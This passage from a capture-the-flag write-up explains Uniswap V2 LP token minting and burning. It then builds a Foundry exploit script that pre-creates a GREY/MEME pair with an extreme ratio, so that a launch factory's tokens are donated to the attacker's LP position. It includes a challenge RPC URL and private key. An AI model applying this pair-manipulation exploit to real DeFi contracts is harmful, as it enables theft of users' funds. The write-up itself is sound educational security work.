</span></span><span class="line"><span class="cl">     <span class="n">_update</span><span class="p">(</span><span class="n">balance0</span><span class="p">,</span> <span class="n">balance1</span><span class="p">,</span> <span class="n">_reserve0</span><span class="p">,</span> <span class="n">_reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="n">feeOn</span><span class="p">)</span> <span class="n">kLast</span> <span class="o">=</span> <span class="kt">uint</span><span class="p">(</span><span class="n">reserve0</span><span class="p">).</span><span class="n">mul</span><span class="p">(</span><span class="n">reserve1</span><span class="p">);</span> <span class="c1">// reserve0 and reserve1 are up-to-date
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="n">emit</span> <span class="n">Mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount0</span><span class="p">,</span> <span class="n">amount1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first liquidity provider deposits both tokens into the pool, and Uniswap uses these amounts to establish the initial price ratio.</p>
<p>For example, if someone adds $1000$ $\text{token0}$ and $100000$ $\text{token1}$ as initial liquidity, then the provider will get:
$$
\begin{align*}
\text{lpTokens} &amp;= \sqrt{\text{amountToken0} \cdot \text{amountToken1}} - \text{minLiquidity} \\
&amp;= \sqrt{1000 \cdot 100000} - 1000 \\
&amp;= 9000
\end{align*}
$$
where the initial price (which is the ratio of the reserves of $token0$ and $tokenB$) will be:
$$\text{token0}:\text{token1} = 1:100$$
and the remaining state will be:
$$
\begin{align*}
&amp;\text{reserve0} = 1000 \\
&amp;\text{reserve1} = 100000 \\
&amp;\text{totalSupply} = 10000 \\
\end{align*}
$$</p>
<p>Now, what about subsequent liquidity providers? If you notice in the <code>mint</code> code, any provider can actually provide tokens in any ratio of $\text{token0}$ and $\text{token1}$, without being forced to follow the ratio of the current reserves.</p>
<p>However, observing the LP tokens calculation code, the number of LP tokens that the provider gets still follows the current ratio.</p>
<p>Continuing the above example, if the current ratio is 1:100 and a liquidity provider tries to add tokens in a 1:1 ratio (i.e. provide $100000$ $\text{token0}$ and $100000$ $\text{token1}$), the calculation will be:
$$
\begin{align*}
\text{lpTokens} &amp;= \min\left(\frac{\text{amountToken0} \cdot \text{totalSupply}}{\text{reserve0}}, \frac{\text{amountToken1} \cdot \text{totalSupply}}{\text{reserve1}}\right) \\
&amp;= \min(\frac{100000 \cdot 10000}{1000}, \frac{100000 \cdot 10000}{100000}) \\
&amp;= \min(1000000, 10000) \\
&amp;= 10000
\end{align*}
$$
and the new state will be:
$$
\begin{align*}
&amp;\text{reserve0} = 101000 \\
&amp;\text{reserve1} = 200000 \\
&amp;\text{totalSupply} = 20000 \\
\end{align*}
$$</p>
<p>Observe that in this case, even though we provided $100000$ $\text{token0}$, we only received LP tokens proportional to the smaller of the two ratios. We would actually receive the same number of LP tokens even if we had only provided $1000$ $\text{token0}$ (the smaller amount). This is because the <code>min()</code> function ensures LP tokens are minted based on whichever token amount maintains the current pool ratio. Any excess $\text{token0}$ we provided gets added to the pool without receiving corresponding LP tokens, effectively <strong>donating</strong> the remaining $\text{token0}$ to the existing LP token holders.</p>
<p>Notice that the effect of donation can be seen when the initial liquidity provider wants to <code>burn</code> their $lpTokens$. Let&rsquo;s examine the <code>burn</code> function below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"> <span class="c1">// this low-level function should be called from a contract which performs important safety checks
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="kd">function</span> <span class="nf">burn</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">)</span> <span class="k">external</span> <span class="n">lock</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">amount0</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="p">(</span><span class="kt">uint112</span> <span class="n">_reserve0</span><span class="p">,</span> <span class="kt">uint112</span> <span class="n">_reserve1</span><span class="p">,)</span> <span class="o">=</span> <span class="n">getReserves</span><span class="p">();</span> <span class="c1">// gas savings
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="kt">address</span> <span class="n">_token0</span> <span class="o">=</span> <span class="n">token0</span><span class="p">;</span>                                <span class="c1">// gas savings
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="kt">address</span> <span class="n">_token1</span> <span class="o">=</span> <span class="n">token1</span><span class="p">;</span>                                <span class="c1">// gas savings
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="kt">uint</span> <span class="n">balance0</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">_token0</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">     <span class="kt">uint</span> <span class="n">balance1</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">_token1</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">     <span class="kt">uint</span> <span class="n">liquidity</span> <span class="o">=</span> <span class="n">balanceOf</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="kt">bool</span> <span class="n">feeOn</span> <span class="o">=</span> <span class="n">_mintFee</span><span class="p">(</span><span class="n">_reserve0</span><span class="p">,</span> <span class="n">_reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="kt">uint</span> <span class="n">_totalSupply</span> <span class="o">=</span> <span class="n">totalSupply</span><span class="p">;</span> <span class="c1">// gas savings, must be defined here since totalSupply can update in _mintFee
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="n">amount0</span> <span class="o">=</span> <span class="n">liquidity</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">balance0</span><span class="p">)</span> <span class="o">/</span> <span class="n">_totalSupply</span><span class="p">;</span> <span class="c1">// using balances ensures pro-rata distribution
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="n">amount1</span> <span class="o">=</span> <span class="n">liquidity</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">balance1</span><span class="p">)</span> <span class="o">/</span> <span class="n">_totalSupply</span><span class="p">;</span> <span class="c1">// using balances ensures pro-rata distribution
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="nb">require</span><span class="p">(</span><span class="n">amount0</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">amount1</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="n">_burn</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">liquidity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="n">_safeTransfer</span><span class="p">(</span><span class="n">_token0</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="n">_safeTransfer</span><span class="p">(</span><span class="n">_token1</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="n">balance0</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">_token0</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">     <span class="n">balance1</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">_token1</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="n">_update</span><span class="p">(</span><span class="n">balance0</span><span class="p">,</span> <span class="n">balance1</span><span class="p">,</span> <span class="n">_reserve0</span><span class="p">,</span> <span class="n">_reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="n">feeOn</span><span class="p">)</span> <span class="n">kLast</span> <span class="o">=</span> <span class="kt">uint</span><span class="p">(</span><span class="n">reserve0</span><span class="p">).</span><span class="n">mul</span><span class="p">(</span><span class="n">reserve1</span><span class="p">);</span> <span class="c1">// reserve0 and reserve1 are up-to-date
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="n">emit</span> <span class="n">Burn</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount0</span><span class="p">,</span> <span class="n">amount1</span><span class="p">,</span> <span class="n">to</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s say that we are the initial liquidity provider and want to burn all of our $\text{lpTokens}$ (which is $9000$). The amount that we will receive will be:
$$
\begin{align*}
\text{amountToken0} &amp;= \frac{\text{lpTokens} \cdot \text{reserve0}}{\text{totalSupply}} \\
&amp;= \frac{9000 \cdot 101000}{20000} \\
&amp;= 45450
\end{align*}
$$
$$
\begin{align*}
\text{amountToken1} &amp;= \frac{\text{lpTokens} \cdot \text{reserve1}}{\text{totalSupply}} \\
&amp;= \frac{9000 \cdot 200000}{20000} \\
&amp;= 90000
\end{align*}
$$
As we can see above, when we burn the lpTokens, we receive $45450$ of $\text{token0}$ and $90000$ of $\text{token1}$. The initial liquidity provider easily gains a profit of $44550$ $\text{token0}$ due to the donation from the second minter (even though we lose some of the $\text{token1}$ due to the initial provider needing to lock $1000$ of their LP Tokens forever).</p>
<h4 id="crafting-the-solution">Crafting the Solution</h4>
<p>Now that we understand how liquidity providers work in the Uniswap V2 Pair, let&rsquo;s return to our previous observation. Remember that in the <code>launchToken</code> code, the function will still launch the token even if the pair already exists. This means that when <code>launchToken</code> provides liquidity with a different ratio than the existing pair&rsquo;s ratio, the <code>factory</code> contract could lose some of its provided tokens to the initial liquidity provider who created the pair.</p>
<p>Based on our understanding of how Uniswap V2 pair liquidity minting works, we can solve this challenge by creating the <code>GREY/MEME</code> pair before triggering <code>launchToken</code>. This allows us to control the pair&rsquo;s initial price ratio, potentially causing the <code>GREY</code> tokens that the factory provides during <code>launchToken</code> to be donated to our LP token holdings as the initial liquidity provider.</p>
<p>The key is to create the <code>GREY/MEME</code> pair with an extreme initial ratio. We want to set up the ratio such that when the <code>factory</code> calls <code>launchToken</code>, most of its provided <code>GREY</code> tokens will be considered &ldquo;excess&rdquo; compared to our established ratio. These excess tokens will be donated to our LP token position rather than being properly accounted for in new LP token minting.</p>
<p>We start with <code>5 ether</code> worth of <code>GREY</code> tokens. To maximize the donation effect, we&rsquo;ll create an extreme ratio in the <code>GREY/MEME</code> pair by using just 1 wei of <code>GREY</code> for all our <code>MEME</code> tokens. The detailed plan would be:</p>
<ol>
<li>Use the <code>buyToken</code> feature in <code>factory</code> to swap almost all our <code>GREY</code> tokens (<code>5 ether - 1 wei</code>) for <code>MEME</code> tokens.
<ul>
<li>Note that this will work even though the raised <code>GREY</code> will exceed the target (<code>6 ether</code>) due to our previous observation that the guard only checks the current state instead of the future state.</li>
</ul>
</li>
<li>Create the <code>GREY/MEME</code> pair via Uniswap with our extreme ratio (1 wei GREY : all our MEME).</li>
<li>Trigger <code>launchToken</code>, which will cause the factory&rsquo;s <code>GREY</code> tokens to be donated to our LP position due to the ratio mismatch.</li>
<li>Burn all our LP tokens to receive both tokens back.</li>
<li>Swap all received <code>MEME</code> tokens back to <code>GREY</code> through the Uniswap V2 Pair.</li>
</ol>
<p>If executed correctly, we should end up with significantly more <code>GREY</code> tokens than we started with. Let&rsquo;s try to implement this plan while going through each step in detail.</p>
<h4 id="executing-the-solution">Executing the Solution</h4>
<p>To help us execute our plan, I will use a Foundry script.</p>
<h5 id="initial-setup">Initial Setup</h5>
<p>Let&rsquo;s start by preparing a new project using the <code>forge init --no-commit</code> command.</p>
<img src="https://i.imgur.com/NeOcarD.png"/>
<p>Next, let&rsquo;s copy the challenge folder <code>lib/</code> and the contracts (<code>Setup.sol</code>, <code>Factory.sol</code>, and <code>Token.sol</code>) to the <code>script</code> folder. We&rsquo;ll prepare our script inside <code>Counter.s.sol</code> (because I&rsquo;m too lazy to rename and prepare proper folder structures lol ðŸ˜¬). The folder structure will look like this:</p>
<img src="https://i.imgur.com/rJxirXB.png"/>
<p>Now we can begin crafting our exploit script in the <code>Counter.s.sol</code> file. First, let&rsquo;s import all the required files and clean up the <code>run()</code> function by removing any unused code and variables. Our initial script template will look like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Setup</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">GREY</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/GREY.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">UniswapV2Factory</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/v2-core/UniswapV2Factory.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Factory</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Factory.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Token</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Token.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IUniswapV2Pair</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/v2-core/interfaces/IUniswapV2Pair.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/v2-core/interfaces/IERC20.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">CounterScript</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we&rsquo;ve prepared the script file, let&rsquo;s implement our plan by filling in the <code>run</code> function. We&rsquo;ll start by connecting to the given RPC and initializing variables with the contract addresses we have.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="k">memory</span> <span class="n">rpc</span> <span class="o">=</span> <span class="s">&#34;http://challs2.nusgreyhats.org:33502/0b3164f8-2adc-465a-9743-61c1517b2e9a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">privateKey</span> <span class="o">=</span> <span class="mh">0xd41bcc5d73608ffa85c1bada6c8a7a52fb050f03d17d139c2db146de078d95a5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">setupAddress</span> <span class="o">=</span> <span class="mh">0xbE49C81C4D7A188e3C24043556d78C3dC61fc3BE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="nb">sender</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">addr</span><span class="p">(</span><span class="n">privateKey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Connect to network
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="n">rpc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Set up contracts
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Setup</span> <span class="n">setup</span> <span class="o">=</span> <span class="n">Setup</span><span class="p">(</span><span class="n">setupAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">GREY</span> <span class="n">grey</span> <span class="o">=</span> <span class="n">GREY</span><span class="p">(</span><span class="n">setup</span><span class="p">.</span><span class="n">grey</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">UniswapV2Factory</span> <span class="n">uniswapV2Factory</span> <span class="o">=</span> <span class="n">UniswapV2Factory</span><span class="p">(</span><span class="n">setup</span><span class="p">.</span><span class="n">uniswapV2Factory</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">Factory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">Factory</span><span class="p">(</span><span class="n">setup</span><span class="p">.</span><span class="n">factory</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">Token</span> <span class="n">meme</span> <span class="o">=</span> <span class="n">Token</span><span class="p">(</span><span class="n">setup</span><span class="p">.</span><span class="n">meme</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="claim-and-swap">Claim and Swap</h5>
<p>Now, let&rsquo;s implement our first step: claiming our initial <code>GREY</code> tokens and swapping them through the <code>Factory</code> contract&rsquo;s <code>buyTokens</code> function.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[...]</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">        START EXPLOIT
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">privateKey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Claim initial GREY tokens (5 ether)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">setup</span><span class="p">.</span><span class="n">claim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Buy MEME tokens 5 ether - 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">grey</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">factory</span><span class="p">),</span> <span class="mi">5</span> <span class="kc">ether</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">factory</span><span class="p">.</span><span class="n">buyTokens</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">meme</span><span class="p">),</span> <span class="mi">5</span> <span class="kc">ether</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Print MEME balance and factory reserves
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;MEME balance after buy:&#34;</span><span class="p">,</span> <span class="n">meme</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">sender</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">uint256</span> <span class="n">virtualLiquidity</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">reserveGREY</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">reserveToken</span><span class="p">)</span> <span class="o">=</span> <span class="n">factory</span><span class="p">.</span><span class="n">pairs</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">meme</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Factory reserveGREY:&#34;</span><span class="p">,</span> <span class="n">reserveGREY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Factory reserveToken:&#34;</span><span class="p">,</span> <span class="n">reserveToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Factory virtualLiquidity:&#34;</span><span class="p">,</span> <span class="n">virtualLiquidity</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on the <code>factory</code> code, the amount of <code>MEME</code> tokens we received will be:
$$
\begin{align*}
\text{amountOut} &amp;= \frac{\text{amountIn} \cdot \text{reserveMEME}}{\text{reserveGREY}+\text{amountIn}} \\
&amp;= \frac{(5 \cdot 10^{18} - 1) \cdot (500000 \cdot 10^{18})}{(4 \cdot 10^{18}) + (5 \cdot 10^{18} - 1)} \\
&amp;= 277777777777777777753086
\end{align*}
$$
and the <code>factory</code> reserve will be:
$$
\begin{align*}
&amp;\text{reserveGREY} = (9 \cdot 10^{18} - 1) \\
&amp;\text{reserveMEME} = (222222222222222222246914) \\
\end{align*}
$$</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>How to Run<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>To simulate the script without submitting an actual transaction, use the command: <code>forge script ./script/Counter.s.sol:CounterScript</code>.</p>
<p>To actually submit the transaction, simply add <code>--broadcast</code>.</p>
</div>
        </div>
    </div>
<p>If we try to run our script, we will see that our calculation is correct:</p>
<img src="https://i.imgur.com/R8FkCsQ.png"/>
<h5 id="create-uniswap-v2-pair">Create Uniswap V2 Pair</h5>
<p>Next, we&rsquo;ll create a Uniswap V2 Pair using our owned <code>GREY</code> and <code>MEME</code> tokens, initializing it with an extreme ratio between the two tokens.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[...]</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Create pair directly and setup initial liquidity of 1 wei GREY and ALL MEME tokens that we had
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">address</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">uniswapV2Factory</span><span class="p">.</span><span class="n">createPair</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">grey</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">meme</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">grey</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">pair</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">meme</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">pair</span><span class="p">,</span> <span class="n">meme</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">sender</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">liquidity</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">mint</span><span class="p">(</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Liquidity minted:&#34;</span><span class="p">,</span> <span class="n">liquidity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Log reserves after our initial mint
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="kt">uint112</span> <span class="n">reserve0</span><span class="p">,</span> <span class="kt">uint112</span> <span class="n">reserve1</span><span class="p">,)</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">getReserves</span><span class="p">();</span>
